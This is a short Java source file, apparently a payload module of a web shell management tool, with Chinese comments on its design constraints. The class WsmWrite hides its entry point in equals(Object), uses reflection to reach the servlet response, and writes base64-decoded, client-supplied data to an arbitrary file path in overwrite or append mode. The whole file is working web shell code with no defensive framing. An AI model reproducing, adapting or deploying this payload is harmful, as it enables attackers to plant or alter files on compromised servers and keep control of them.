// 文件写入载荷：base64 内容 + 覆盖/追加模式（客户端分块驱动大文件）。
// 约束同 WsmProbe：默认包、全反射、单 class、占位值唯一、零跨类引用。
public class WsmWrite {

	public static final String p = "WSMW-P0"; // 目标路径
	public static final String b = "WSMW-B0"; // base64 内容
	public static final String m = "WSMW-M0"; // w=覆盖 a=追加

	public boolean equals(Object ctx) {
		try {
			byte[] data = java.util.Base64.getDecoder().decode(b);
			java.io.FileOutputStream fo = new java.io.FileOutputStream(p, "a".equals(m));
			fo.write(data);
			fo.close();
			write(respOf(ctx), "OK " + data.length);
		} catch (Throwable e) {
			try { write(respOf(ctx), "!ERR " + e); } catch (Throwable ignored) {}
		}
		return true;
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) {
			Object[] a = (Object[]) ctx;
			return a.length > 1 ? a[1] : null;
		}
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
